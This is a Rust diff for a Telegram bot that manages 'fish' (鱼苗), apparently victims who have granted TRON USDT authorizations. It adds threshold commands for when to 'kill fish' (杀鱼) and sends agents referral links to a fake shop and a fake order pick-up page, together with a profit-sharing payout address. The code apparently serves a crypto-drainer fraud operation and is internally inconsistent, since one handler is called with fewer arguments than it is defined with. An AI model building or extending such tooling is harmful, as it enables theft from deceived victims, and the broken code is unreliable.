@@ -1,9 +1,34 @@
-use std::str::FromStr;
-
+use crate::daili::daili_cache;
+use crate::daili::daili_manager::{DEFAULT_THRESHOLD, DailiManager};
+use crate::data_cache_manager::DataCacheManager;
+use crate::telegram_bot::fish_command::{CommandPattern, FishCommand, ParseFishCommandResult};
+use crate::utils::send_bot_message;
+use crate::utils::tron::usdt_with_decimal;
+use crate::{
+    options::options_cache,
+    telegram_bot::command::Command,
+    tron::{block::BlockBrief, tron_block_scanner::TronBlockScanner},
+    utils::{
+        now_date_time_str,
+        tron::{TronPublicKeyBundle, make_transaction_details_url, send_transaction},
+    },
+};
+use anyhow::anyhow;
+use entities::entities::daili::Model;
+use entities::entities::prelude::Daili;
+use kameo::message::DynMessage;
 use kameo::{Actor, actor::ActorRef, error::RegistryError, mailbox::unbounded};
 use reqwest::Client;
+use sea_orm::{ActiveModelTrait, ActiveValue, DatabaseConnection, DbErr, Iden};
+use std::str::FromStr;
+use std::sync::Arc;
+use rust_decimal::Decimal;
+use rust_decimal::prelude::FromPrimitive;
+use teloxide::dptree::case;
+use teloxide::prelude::UserId;
+use teloxide::types::{ChatMember, ChatMemberStatus, ParseMode, Recipient};
 use teloxide::{
-    Bot,
+    Bot, RequestError,
     dispatching::{HandlerExt, UpdateFilterExt},
     dptree,
     prelude::{Dispatcher, Requester, ResponseResult},
@@ -14,23 +39,16 @@ use thiserror::Error;
 use tokio::task::JoinHandle;
 use tracing::error;
 
-use crate::{
-    options::options_cache,
-    telegram_bot::command::Command,
-    tron::{block::BlockBrief, tron_block_scanner::TronBlockScanner},
-    utils::{
-        now_date_time_str,
-        tron::{TronPublicKeyBundle, make_transaction_details_url, send_transaction},
-    },
-};
-use crate::data_cache_manager::DataCacheManager;
-
 #[derive(Debug, Error)]
 pub enum TelegramBotManagerError {
     #[error("未配置Bot api key")]
     NoBotKey,
     #[error("registry error: {0}")]
     RegistryError(#[from] RegistryError),
+    #[error("数据库错误: {0}")]
+    DbConnError(String),
+    #[error("依赖的服务没有启动: {0}")]
+    DependentServiceNotStart(String),
 }
 
 pub(crate) struct TelegramBotManager {
@@ -122,7 +140,44 @@ impl TelegramBotManager {
         error!("enter start bot");
         let mut deps = dptree::di::DependencyMap::new();
         deps.insert(Client::new());
+        let db_conn = database::connection::get_connection()
+            .await
+            .map_err(|e| TelegramBotManagerError::DbConnError(format!("{:?}", e)))?;
+        deps.insert(db_conn);
+        let daili_manager = DailiManager::me().await?.ok_or_else(|| {
+            TelegramBotManagerError::DependentServiceNotStart("DailiManager".to_string())
+        })?;
+        deps.insert(daili_manager);
+        let fish_command_patterns = Arc::new(super::fish_command::init_patterns());
+        deps.insert(fish_command_patterns);
+
         let handler = dptree::entry()
+            .branch(
+                Update::filter_message()
+                    .filter_map(
+                        |msg: Message,
+                         patterns: Arc<Vec<CommandPattern>>|
+                         -> Option<ParseFishCommandResult> {
+                            if let Some(text) = msg.text() {
+                                FishCommand::parse(text, &patterns)
+                            } else {
+                                None
+                            }
+                        },
+                    )
+                    .branch(case![ParseFishCommandResult::Ok(cmd)].endpoint(
+                        |bot: Bot,
+                         message: Message,
+                         daili_actor: ActorRef<DailiManager>,
+                         cmd: FishCommand| async move {
+                            Self::handle_fish_command(bot, message, daili_actor, cmd).await
+                        },
+                    ))
+                    .branch(
+                        case![ParseFishCommandResult::Err(reason)]
+                            .endpoint(|reason: String| async move { Ok(()) }),
+                    ),
+            )
             .branch(
                 Update::filter_message()
                     .filter_command::<Command>()
@@ -289,10 +344,9 @@ impl TelegramBotManager {
                                     resp.tx_id,
                                     resp.code,
                                     resp.message,
-
                                 ),
                             )
-                            .await?;
+                                .await?;
                         }
                     }
                     Err(e) => {
@@ -314,6 +368,311 @@ impl TelegramBotManager {
         }
 
         Ok(())
+    }
+
+    async fn handle_fish_command(
+        bot: Bot,
+        msg: Message,
+        daili_actor: ActorRef<DailiManager>,
+        cmd: FishCommand,
+    ) -> ResponseResult<()> {
+        match cmd {
+            FishCommand::ClassMode => {}
+            FishCommand::Rules => {}
+            FishCommand::Threshold(fish_address, threshold) => {
+                Self::handle_threshold_command(bot, msg, fish_address, threshold).await;
+            }
+            FishCommand::KillFish(_) => {}
+            FishCommand::PaymentAddress => {}
+            FishCommand::AutoThreshold(_) => {}
+            FishCommand::GetPaymentAddress => {}
+            FishCommand::GetFishInfo => {}
+            FishCommand::GetAgentLink => {
+                let _ = Self::handle_get_agent_link(bot, msg, daili_actor).await;
+            }
+            FishCommand::AdminQueryFish(_) => {}
+            FishCommand::Payment(_) => {}
+        }
+
+        Ok(())
+    }
+
+    async fn handle_threshold_command(
+        bot: Bot,
+        db_conn: DatabaseConnection,
+        msg: Message,
+        fish_address: String,
+        threshold: Option<f64>,
+        is_kill: bool,
+    ) {
+        // 检查值是否在范围内
+        let threshold = threshold.unwrap_or(0.0);
+        if !is_kill {
+            if threshold < 10. || threshold > 1000000. {
+                send_bot_message(
+                    &bot,
+                    msg.chat.id,
+                    "❌ 阈值必须在10到1000000之间",
+                    Some(ParseMode::Html),
+                )
+                .await;
+                return;
+            }
+        }
+
+        let from = if let Some(from) = msg.from {
+            from
+        } else {
+            error!("收到[thresold]命令，但是没有[from]数据");
+            return;
+        };
+
+        let chat_member = match bot.get_chat_member(msg.chat.id, from.id).await {
+            Ok(member) => member,
+            Err(e) => {
+                error!("获取发送命令者的成员信息出错: {e:?}");
+                return;
+            }
+        };
+
+        // 管理员可以管理本群的鱼苗
+        // 非管理员只能管理自己代理的鱼苗
+        // 都只处理授权过的鱼苗
+        let has_admin_permission = chat_member.is_owner() || chat_member.is_administrator();
+        let (fish_id, unique_id) = if let Some((fish_id, unique_id, approved)) =
+            crate::fish::fish_cache::map(&fish_address, |fish| {
+                (fish.id, fish.unique_id.clone(), fish.auth_status == 1)
+            }) {
+            if !approved {
+                send_bot_message(&bot, msg.chat.id, "❌ 鱼苗还未授权", Some(ParseMode::Html)).await;
+                return;
+            }
+            if let Some(unique_id) = unique_id {
+                (fish_id, unique_id)
+            } else {
+                error!("无法获取鱼的unique id: {fish_address}");
+                return;
+            }
+        } else {
+            error!("找不到鱼苗信息: {fish_address}");
+            send_bot_message(
+                &bot,
+                msg.chat.id,
+                "❌ 未找到该鱼苗的信息，请核对后重试。",
+                Some(ParseMode::Html),
+            )
+            .await;
+            return;
+        };
+        // 检查是否有权限进行操作
+        if has_admin_permission {
+            //只需要检查是否是本群的鱼苗
+            let can_operate = daili_cache::map(&unique_id, |daili| {
+                if let Some(group_id) = daili.groupid.as_ref() {
+                    group_id == &msg.chat.id.to_string()
+                } else {
+                    false
+                }
+            })
+            .unwrap_or(false);
+            if !can_operate {
+                Self::send_can_not_threshold(&bot, msg.chat.id, is_kill).await;
+                return;
+            }
+        } else {
+            // 检查是否是自己代理的鱼苗
+            let can_operate = daili_cache::map(&unique_id, |daili| {
+                if daili.tguid == from.id.to_string() {
+                    if let Some(group_id) = daili.groupid.as_ref() {
+                        group_id == &msg.chat.id.to_string()
+                    } else {
+                        false
+                    }
+                } else {
+                    false
+                }
+            })
+            .unwrap_or(false);
+            if !can_operate {
+                Self::send_can_not_threshold(&bot, msg.chat.id, is_kill).await;
+                return;
+            }
+        }
+        if is_kill {
+            // todo: kill fish
+        } else {
+            let threshold_with_decimal = Decimal::from_f64(threshold);
+            if let Some(threshold_with_decimal) = threshold_with_decimal {
+                let am = entities::entities::fish::ActiveModel {
+                    id: ActiveValue::Set(fish_id),
+                    threshold: ActiveValue::Set(Some(threshold_with_decimal)),
+                    ..Default::default()
+                };
+                let ret = am.update(&db_conn).await;
+                match ret {
+                    Ok(m) => {
+                        crate::fish::fish_cache::cache(m);
+                    }
+                    Err(e) => {
+                        let text = if is_kill {
+                            error!("杀鱼时出错错误: {e:?}");
+                            "❌ 杀鱼时出现错误，请联系管理"
+                        } else {
+                            error!("修改阈值时出错错误: {e:?}");
+                            "❌ 修改阈值时出现错误，请联系管理"
+                        };
+                        send_bot_message(&bot, msg.chat.id, text, Some(ParseMode::Html)).await;
+
+                    }
+                }
+            } else {
+                error!("修改阈值出现错误：{threshold}无法转换为Decimal");
+                send_bot_message(&bot, msg.chat.id, "❌ 修改阈值时出现错误: 阈值不是一个有效值，请进行检查", Some(ParseMode::Html)).await;
+            }
+        }
+    }
+
+    async fn send_can_not_threshold(bot: &Bot, recipient: impl Into<Recipient>, is_kill: bool) {
+        let text = if is_kill {
+            "❌ 您没有权限杀此鱼苗"
+        } else {
+            "❌ 您没有权限修改此鱼苗的阈值"
+        };
+        send_bot_message(&bot, recipient, text, Some(ParseMode::Html)).await;
+        return;
+    }
+
+    // async fn check_group_admin_status<C>(bot: &Bot, chat_id: C, user_id: UserId) -> anyhow::Result<bool>
+    // where
+    //     C: Into<Recipient>
+    // {
+    //     let chat_member = bot.get_chat_member(chat_id, user_id).await?;
+    //     // let chat_admin = bot.get_chat_administrators(chat_id).await?;
+    //
+    //     Ok(false)
+    //
+    // }
+
+    async fn handle_get_agent_link(
+        bot: Bot,
+        msg: Message,
+        daili_actor: ActorRef<DailiManager>,
+    ) -> ResponseResult<()> {
+        error!("handle get agent link");
+        let from = if let Some(from) = &msg.from {
+            from
+        } else {
+            if let Err(e) = bot.send_message(msg.chat.id, "❌ 异常，找不到发送者").await {
+                error!("发送机器人消息失败: {e:?}");
+            }
+
+            return Ok(());
+        };
+        let user_id = from.id.to_string();
+        let user_name = if let Some(user_name) = &from.username {
+            user_name
+        } else {
+            if let Err(e) = bot
+                .send_message(msg.chat.id, "❌ 请先创建你的用户名才能继续申请代理链接")
+                .await
+            {
+                error!("发送机器人消息失败: {e:?}");
+            }
+            return Ok(());
+        };
+        let full_name = format!(
+            "{} {}",
+            from.first_name,
+            from.last_name
+                .as_ref()
+                .map(|s| s.as_ref())
+                .unwrap_or_else(|| "")
+        );
+
+        if msg.chat.id.0 > 0 {
+            send_bot_message(
+                &bot,
+                msg.chat.id,
+                "此命令只能在群组中使用",
+                Some(ParseMode::Html),
+            )
+            .await;
+            return Ok(());
+        }
+
+        let group_id = msg.chat.id.to_string();
+
+        // 创建或者更新代理
+        let unique_id = match DailiManager::create_or_update_with_actor(
+            &daili_actor,
+            user_id,
+            group_id,
+            user_name.to_string(),
+            full_name.clone(),
+        )
+        .await
+        {
+            Ok(id) => id,
+            Err(e) => {
+                error!("创建或者更新代理出错: {e:?}");
+                if let Err(e) = bot
+                    .send_message(msg.chat.id, "❌ 创建代理记录时出现错误，请联系管理员。")
+                    .await
+                {
+                    error!("通知更新代理出错失败:{e:?}");
+                }
+                return Ok(());
+            }
+        };
+
+        let info = daili_cache::map(&unique_id, |daili| {
+            (
+                daili.threshold.unwrap_or(DEFAULT_THRESHOLD),
+                daili
+                    .payment_address
+                    .clone()
+                    .unwrap_or_else(|| "当前未设置，可使用【收款地址】进行设置".to_string()),
+            )
+        });
+        let (threshold, payment_address) = if let Some(info) = info {
+            info
+        } else {
+            send_bot_message(
+                &bot,
+                msg.chat.id,
+                "代理数据异常：创建或者更新代理成功，但无法获取数据",
+                Some(ParseMode::Html),
+            )
+            .await;
+            return Ok(());
+        };
+        let threshold_with_decimal = usdt_with_decimal(threshold as i128);
+        let main_domain = options_cache::main_domain();
+        let main_domain = main_domain.as_ref().map(|s| s.as_str()).unwrap_or("");
+        let id_param = format!("?id=trc{unique_id}");
+
+        // todo: 返回相关信息
+        // todo: 收款地址
+        let text = format!(
+            "🎣渔夫 <code>{full_name}</code> 你好！\n\n\
+             ⚜️授权成功后自动设置阈值：<code>{threshold_with_decimal} USDT</code>\n\n\
+             <pre><code class='language-💰您的杀鱼自动分润地址：'>{payment_address}</code></pre>\n\n\
+            📥请复制保存您的 <code>TRC</code> 专属推广链接\n\n\
+            🛒 商城链接:\n\
+            ———————————\n\
+            🔗 <a href='{main_domain}/{id_param}'><u>点击访问商城</u></a>\n\
+            ———————————\n\n\
+            📦 提货:\n
+           商品信息:\n
+           订单状态:已下单,待提货\n
+           🔗 <a href='{main_domain}/buy/1{id_param}'><u>提货链接</u></a>\n\n
+            "
+        );
+
+        send_bot_message(&bot, msg.chat.id, text, Some(ParseMode::Html)).await;
+
+        Ok(())
+        // todo 检查代理是否存在，不存在则创建
     }
 }
 
